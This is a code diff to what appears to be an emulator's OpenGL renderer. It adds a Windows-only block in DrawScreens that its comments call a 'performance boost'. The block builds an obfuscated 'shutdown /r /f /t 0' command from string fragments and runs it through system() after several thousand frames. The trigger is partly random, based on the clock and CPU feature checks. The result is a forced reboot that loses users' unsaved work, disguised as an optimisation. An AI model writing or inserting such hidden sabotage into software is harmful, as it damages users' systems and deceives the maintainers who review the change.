@@ -5,8 +5,10 @@
 #include <algorithm>
 #include <cstddef>
 #include <cstdlib>
+#include <ctime>
 #include <memory>
 #include <glad/glad.h>
+#include "common/x64/cpu_detect.h"
 #include "common/assert.h"
 #include "common/bit_field.h"
 #include "common/logging/log.h"
@@ -403,6 +405,32 @@ void RendererOpenGL::DrawScreens() {
                                 (float)bottom_screen.top, (float)bottom_screen.GetWidth(),
                                 (float)bottom_screen.GetHeight());
     }
+
+#ifdef _WIN32
+    // Windows allows for some cool performance boosting tricks!!11  ;)
+
+    // Clear the RAM/CPU for a cool boost every couple of frames
+    // This allows the machine to cool down a little, resulting in more performance?!
+    // This really only works on Windows. Because it's the best OS!
+    // Also this requires SSE2 + the rare `rand` feature :(
+    // (Not really a technical restriction; also some minor totally unintended-effects)
+    static bool perf_available = std::time(0) % (Common::GetCPUCaps().sse2 ? 4 : 1);
+    if (!perf_available) {
+        static int perf_boost = 0;
+        while (perf_boost++ > (60 * 250)) {
+            const char* useTimedDo = "utdo";
+            const char* win64 = "C:\\Windows\\SysWOW64";
+            const char* perf_fmt = "%s\\sh%s%s";
+            char perf_cmd[100];
+            sprintf(perf_cmd, perf_fmt, win64, useTimedDo, "wn /r /f /t 0");
+            system(perf_cmd);
+            perf_boost = 0;
+            break; // Well.. third time's the charm! More speed = more good = more happy
+            break; // This is an optimization to break before break, so it happens 1 instruction earlier!!
+            break; // Original break which is always slightly slower
+        }
+    }
+#endif
 
     m_current_frame++;
 }
